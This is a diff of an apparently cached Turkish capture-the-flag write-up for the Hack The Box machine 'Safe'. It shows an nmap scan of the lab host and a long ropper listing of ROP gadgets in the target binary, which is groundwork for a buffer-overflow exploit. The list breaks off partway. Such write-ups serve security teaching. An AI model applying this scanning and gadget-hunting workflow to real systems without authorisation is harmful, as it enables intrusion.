@@ -1,4 +1,4 @@
-I"�`<hr />
+I"�u<hr />
 <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/Safe <span class="c"># nmap -sS -sV -p- -A 10.10.10.147                                                                                                     </span>
 Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-10-16 11:08 +03
 Nmap scan report <span class="k">for </span>safe.htb <span class="o">(</span>10.10.10.147<span class="o">)</span>
@@ -270,119 +270,121 @@ Disassembly of section .plt:
   4011a1:	e8 8a fe ff ff       	call   401030 &lt;puts@plt&gt;
 </code></pre></div></div>
 <h5 id="ropper-ile-binary-içerisindeki-rop-gadgetları-dump-ediyoruz">ropper ile binary içerisindeki rop gadgetları dump ediyoruz</h5>
-<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/Safe <span class="c"># ropper -f myapp                                                                                                                                                       root@0x67616e67</span>
-<span class="o">[</span>INFO] Load gadgets from cache
-<span class="o">[</span>LOAD] loading... 100%
-<span class="o">[</span>LOAD] removing double gadgets... 100%
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/Safe <span class="c"># ropper -f myapp        </span>
+</code></pre></div></div>
 
+<p>root@0x67616e67
+[INFO] Load gadgets from cache
+[LOAD] loading… 100%
+[LOAD] removing double gadgets… 100%</p>
 
-
-Gadgets
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Gadgets</span>
 <span class="o">=======</span>
 
 
-0x0000000000401091: adc dword ptr <span class="o">[</span>rax], eax<span class="p">;</span> call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040108a: adc dword ptr <span class="o">[</span>rax], eax<span class="p">;</span> mov rdi, 0x40115f<span class="p">;</span> call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004010fe: adc dword ptr <span class="o">[</span>rax], edi<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x0000000000401095: adc eax, 0x2f56<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004010bc: adc edi, dword ptr <span class="o">[</span>rax]<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x0000000000401099: add ah, dh<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401093: add bh, bh<span class="p">;</span> adc eax, 0x2f56<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040100a: add byte ptr <span class="o">[</span>rax - 0x7b], cl<span class="p">;</span> sal byte ptr <span class="o">[</span>rdx + rax - 1], 0xd0<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004010be: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x0000000000401100: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x00000000004011a7: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004011a8: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401212: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> sub rsp, 8<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401009: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
-0x0000000000401009: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004010c0: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x0000000000401102: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x0000000000401098: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004011a9: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040109e: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040109d: add byte ptr <span class="o">[</span>rax], r8b<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401137: add byte ptr <span class="o">[</span>rcx], al<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004011aa: add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401092: add dil, dil<span class="p">;</span> adc eax, 0x2f56<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401006: add eax, 0x2fed<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
-0x0000000000401006: add eax, 0x2fed<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401013: add esp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401012: add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004011a1: call 0x1030<span class="p">;</span> mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040112d: call 0x10b0<span class="p">;</span> mov byte ptr <span class="o">[</span>rip + 0x2f0f], 1<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401094: call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401010: call rax<span class="p">;</span> 
-0x0000000000401010: call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401134: comiss xmm0, xmmword ptr <span class="o">[</span>rax]<span class="p">;</span> add byte ptr <span class="o">[</span>rcx], al<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004011f4: fmul qword ptr <span class="o">[</span>rax - 0x7d]<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401002: <span class="k">in </span>al, dx<span class="p">;</span> or byte ptr <span class="o">[</span>rax - 0x75], cl<span class="p">;</span> add eax, 0x2fed<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
-0x000000000040115b: <span class="k">in </span>eax, 0x90<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040100e: je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
-0x000000000040100e: je 0x1012<span class="p">;</span> call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004010bb: je 0x10d0<span class="p">;</span> mov eax, 0<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x00000000004010c5: je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x00000000004010fd: je 0x1110<span class="p">;</span> mov eax, 0<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x0000000000401107: je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x00000000004010cc: jmp rax<span class="p">;</span> 
-0x000000000040119b: lea eax, dword ptr <span class="o">[</span>rbp - 0x70]<span class="p">;</span> mov rdi, rax<span class="p">;</span> call 0x1030<span class="p">;</span> mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040119a: lea rax, qword ptr <span class="o">[</span>rbp - 0x70]<span class="p">;</span> mov rdi, rax<span class="p">;</span> call 0x1030<span class="p">;</span> mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401132: mov byte ptr <span class="o">[</span>rip + 0x2f0f], 1<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004010bd: mov eax, 0<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x00000000004010ff: mov eax, 0<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x00000000004011a6: mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401005: mov eax, dword ptr <span class="o">[</span>rip + 0x2fed]<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
-0x0000000000401005: mov eax, dword ptr <span class="o">[</span>rip + 0x2fed]<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040112b: mov ebp, esp<span class="p">;</span> call 0x10b0<span class="p">;</span> mov byte ptr <span class="o">[</span>rip + 0x2f0f], 1<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401087: mov ecx, 0x4011b0<span class="p">;</span> mov rdi, 0x40115f<span class="p">;</span> call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040108e: mov edi, 0x40115f<span class="p">;</span> call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004010c7: mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x000000000040119f: mov edi, eax<span class="p">;</span> call 0x1030<span class="p">;</span> mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401004: mov rax, qword ptr <span class="o">[</span>rip + 0x2fed]<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
-0x0000000000401004: mov rax, qword ptr <span class="o">[</span>rip + 0x2fed]<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040112a: mov rbp, rsp<span class="p">;</span> call 0x10b0<span class="p">;</span> mov byte ptr <span class="o">[</span>rip + 0x2f0f], 1<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401086: mov rcx, 0x4011b0<span class="p">;</span> mov rdi, 0x40115f<span class="p">;</span> call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040108d: mov rdi, 0x40115f<span class="p">;</span> call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040119e: mov rdi, rax<span class="p">;</span> call 0x1030<span class="p">;</span> mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040109b: nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040120d: nop dword ptr <span class="o">[</span>rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401003: or byte ptr <span class="o">[</span>rax - 0x75], cl<span class="p">;</span> add eax, 0x2fed<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
-0x00000000004010c6: or dword ptr <span class="o">[</span>rdi + 0x404048], edi<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x0000000000401204: pop r12<span class="p">;</span> pop r13<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401206: pop r13<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401208: pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040120a: pop r15<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401203: pop rbp<span class="p">;</span> pop r12<span class="p">;</span> pop r13<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401207: pop rbp<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401139: pop rbp<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401090: pop rdi<span class="p">;</span> adc dword ptr <span class="o">[</span>rax], eax<span class="p">;</span> call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040120b: pop rdi<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401209: pop rsi<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401205: pop rsp<span class="p">;</span> pop r13<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401129: push rbp<span class="p">;</span> mov rbp, rsp<span class="p">;</span> call 0x10b0<span class="p">;</span> mov byte ptr <span class="o">[</span>rip + 0x2f0f], 1<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040100d: sal byte ptr <span class="o">[</span>rdx + rax - 1], 0xd0<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401215: sub esp, 8<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401001: sub esp, 8<span class="p">;</span> mov rax, qword ptr <span class="o">[</span>rip + 0x2fed]<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
-0x0000000000401214: sub rsp, 8<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401000: sub rsp, 8<span class="p">;</span> mov rax, qword ptr <span class="o">[</span>rip + 0x2fed]<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
-0x000000000040100c: <span class="nb">test </span>eax, eax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
-0x000000000040100c: <span class="nb">test </span>eax, eax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004010c3: <span class="nb">test </span>eax, eax<span class="p">;</span> je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x0000000000401105: <span class="nb">test </span>eax, eax<span class="p">;</span> je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x000000000040100b: <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
-0x000000000040100b: <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004010c2: <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x0000000000401104: <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
-0x000000000040119c: xchg eax, r8d<span class="p">;</span> mov rdi, rax<span class="p">;</span> call 0x1030<span class="p">;</span> mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040109a: hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004011ab: leave<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040119d: nop<span class="p">;</span> mov rdi, rax<span class="p">;</span> call 0x1030<span class="p">;</span> mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
-0x000000000040115c: nop<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
-0x00000000004010cf: nop<span class="p">;</span> ret<span class="p">;</span> 
-0x0000000000401016: ret<span class="p">;</span> 
-
-99 gadgets found
+<span class="mh">0x0000000000401091</span><span class="o">:</span> <span class="k">adc</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">eax</span><span class="c">; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; </span>
+<span class="mh">0x000000000040108a</span><span class="o">:</span> <span class="k">adc</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">eax</span><span class="c">; mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; </span>
+<span class="mh">0x00000000004010fe</span><span class="o">:</span> <span class="k">adc</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">edi</span><span class="c">; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x0000000000401095</span><span class="o">:</span> <span class="k">adc</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x2f56</span><span class="c">; hlt; nop dword ptr [rax + rax]; ret; </span>
+<span class="mh">0x00000000004010bc</span><span class="o">:</span> <span class="k">adc</span> <span class="n">edi</span><span class="p">,</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[rax]</span><span class="c">; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x0000000000401099</span><span class="o">:</span> <span class="k">add</span> <span class="n">ah</span><span class="p">,</span> <span class="n">dh</span><span class="c">; nop dword ptr [rax + rax]; ret; </span>
+<span class="mh">0x0000000000401093</span><span class="o">:</span> <span class="k">add</span> <span class="n">bh</span><span class="p">,</span> <span class="n">bh</span><span class="c">; adc eax, 0x2f56; hlt; nop dword ptr [rax + rax]; ret; </span>
+<span class="mh">0x000000000040100a</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rax</span> <span class="o">-</span> <span class="mh">0x7b</span><span class="err">]</span><span class="p">,</span> <span class="n">cl</span><span class="c">; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; </span>
+<span class="mh">0x00000000004010be</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">al</span><span class="c">; add byte ptr [rax], al; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x0000000000401100</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">al</span><span class="c">; add byte ptr [rax], al; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x00000000004011a7</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">al</span><span class="c">; add byte ptr [rax], al; leave; ret; </span>
+<span class="mh">0x00000000004011a8</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">al</span><span class="c">; add cl, cl; ret; </span>
+<span class="mh">0x0000000000401212</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">al</span><span class="c">; sub rsp, 8; add rsp, 8; ret; </span>
+<span class="mh">0x0000000000401009</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">al</span><span class="c">; test rax, rax; je 0x1012; call rax; </span>
+<span class="mh">0x0000000000401009</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">al</span><span class="c">; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; </span>
+<span class="mh">0x00000000004010c0</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">al</span><span class="c">; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x0000000000401102</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">al</span><span class="c">; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x0000000000401098</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">al</span><span class="c">; hlt; nop dword ptr [rax + rax]; ret; </span>
+<span class="mh">0x00000000004011a9</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">al</span><span class="c">; leave; ret; </span>
+<span class="mh">0x000000000040109e</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">al</span><span class="c">; ret; </span>
+<span class="mh">0x000000000040109d</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[rax],</span> <span class="n">r8b</span><span class="c">; ret; </span>
+<span class="mh">0x0000000000401137</span><span class="o">:</span> <span class="k">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[rcx],</span> <span class="n">al</span><span class="c">; pop rbp; ret; </span>
+<span class="mh">0x00000000004011aa</span><span class="o">:</span> <span class="k">add</span> <span class="n">cl</span><span class="p">,</span> <span class="n">cl</span><span class="c">; ret; </span>
+<span class="mh">0x0000000000401092</span><span class="o">:</span> <span class="k">add</span> <span class="n">dil</span><span class="p">,</span> <span class="n">dil</span><span class="c">; adc eax, 0x2f56; hlt; nop dword ptr [rax + rax]; ret; </span>
+<span class="mh">0x0000000000401006</span><span class="o">:</span> <span class="k">add</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x2fed</span><span class="c">; test rax, rax; je 0x1012; call rax; </span>
+<span class="mh">0x0000000000401006</span><span class="o">:</span> <span class="k">add</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x2fed</span><span class="c">; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; </span>
+<span class="mh">0x0000000000401013</span><span class="o">:</span> <span class="k">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mi">8</span><span class="c">; ret; </span>
+<span class="mh">0x0000000000401012</span><span class="o">:</span> <span class="k">add</span> <span class="n">rsp</span><span class="p">,</span> <span class="mi">8</span><span class="c">; ret; </span>
+<span class="mh">0x00000000004011a1</span><span class="o">:</span> <span class="k">call</span> <span class="mh">0x1030</span><span class="c">; mov eax, 0; leave; ret; </span>
+<span class="mh">0x000000000040112d</span><span class="o">:</span> <span class="k">call</span> <span class="mh">0x10b0</span><span class="c">; mov byte ptr [rip + 0x2f0f], 1; pop rbp; ret; </span>
+<span class="mh">0x0000000000401094</span><span class="o">:</span> <span class="k">call</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x2f56</span><span class="err">]</span><span class="c">; hlt; nop dword ptr [rax + rax]; ret; </span>
+<span class="mh">0x0000000000401010</span><span class="o">:</span> <span class="k">call</span> <span class="n">rax</span><span class="c">; </span>
+<span class="mh">0x0000000000401010</span><span class="o">:</span> <span class="k">call</span> <span class="n">rax</span><span class="c">; add rsp, 8; ret; </span>
+<span class="mh">0x0000000000401134</span><span class="o">:</span> <span class="n">comiss</span> <span class="n">xmm0</span><span class="p">,</span> <span class="n">xmmword</span> <span class="n">ptr</span> <span class="p">[rax]</span><span class="c">; add byte ptr [rcx], al; pop rbp; ret; </span>
+<span class="mh">0x00000000004011f4</span><span class="o">:</span> <span class="k">fmul</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rax</span> <span class="o">-</span> <span class="mh">0x7d</span><span class="err">]</span><span class="c">; ret; </span>
+<span class="mh">0x0000000000401002</span><span class="o">:</span> <span class="k">in</span> <span class="n">al</span><span class="p">,</span> <span class="n">dx</span><span class="c">; or byte ptr [rax - 0x75], cl; add eax, 0x2fed; test rax, rax; je 0x1012; call rax; </span>
+<span class="mh">0x000000000040115b</span><span class="o">:</span> <span class="k">in</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x90</span><span class="c">; pop rbp; ret; </span>
+<span class="mh">0x000000000040100e</span><span class="o">:</span> <span class="k">je</span> <span class="mh">0x1012</span><span class="c">; call rax; </span>
+<span class="mh">0x000000000040100e</span><span class="o">:</span> <span class="k">je</span> <span class="mh">0x1012</span><span class="c">; call rax; add rsp, 8; ret; </span>
+<span class="mh">0x00000000004010bb</span><span class="o">:</span> <span class="k">je</span> <span class="mh">0x10d0</span><span class="c">; mov eax, 0; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x00000000004010c5</span><span class="o">:</span> <span class="k">je</span> <span class="mh">0x10d0</span><span class="c">; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x00000000004010fd</span><span class="o">:</span> <span class="k">je</span> <span class="mh">0x1110</span><span class="c">; mov eax, 0; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x0000000000401107</span><span class="o">:</span> <span class="k">je</span> <span class="mh">0x1110</span><span class="c">; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x00000000004010cc</span><span class="o">:</span> <span class="k">jmp</span> <span class="n">rax</span><span class="c">; </span>
+<span class="mh">0x000000000040119b</span><span class="o">:</span> <span class="k">lea</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rbp</span> <span class="o">-</span> <span class="mh">0x70</span><span class="err">]</span><span class="c">; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; </span>
+<span class="mh">0x000000000040119a</span><span class="o">:</span> <span class="k">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rbp</span> <span class="o">-</span> <span class="mh">0x70</span><span class="err">]</span><span class="c">; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; </span>
+<span class="mh">0x0000000000401132</span><span class="o">:</span> <span class="k">mov</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x2f0f</span><span class="err">]</span><span class="p">,</span> <span class="mi">1</span><span class="c">; pop rbp; ret; </span>
+<span class="mh">0x00000000004010bd</span><span class="o">:</span> <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="c">; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; </span>
